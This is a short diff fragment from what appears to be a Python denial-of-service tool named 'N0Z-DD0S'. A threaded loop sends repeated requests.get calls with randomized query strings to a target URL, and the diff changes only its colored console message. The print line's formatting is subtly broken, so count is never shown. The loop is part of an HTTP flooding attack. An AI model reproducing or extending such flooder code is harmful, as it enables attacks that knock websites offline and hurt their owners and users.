@@ -88,7 +88,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print (f"{0}\033[93mN0Z-DD0S  \033[4mRequest sent to  \033[33m" +url+ " :'\033[0m".format(count))
+                print (f"[+]\033[91m N0Z-DD0S  \033[4m Request sent to  \033[33m" +url+ " :' \033[0m".format(count))
             except requests.exceptions.ConnectionError:
                 
                 
